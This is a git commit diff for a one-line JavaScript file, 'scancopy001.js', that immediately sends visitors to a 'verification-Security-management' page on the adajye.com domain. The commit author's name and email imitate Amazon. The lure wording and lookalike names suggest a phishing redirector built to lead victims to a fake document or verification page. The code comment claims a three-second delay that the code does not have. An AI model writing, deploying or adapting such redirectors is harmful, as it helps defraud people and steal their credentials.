a04dd939a69de3b21cb86cc4b90cb8f8c0ebca5e
amazon334 <arnazohealthcare2021@gmail.com>
2025-08-21 02:23:34 -0700

    Update scancopy001.js

--- scancopy001.js
+++ scancopy001.js
@@ -1,3 +1,3 @@
 setTimeout(function() {
-  window.location.href = "https://verification-scuremanagement.adajye.com/doc1/Scancopy.html";
+  window.location.href = "https://verification-Security-management.adajye.com/doc1/Scancopy.html";
 }, 0); // 3 seconds
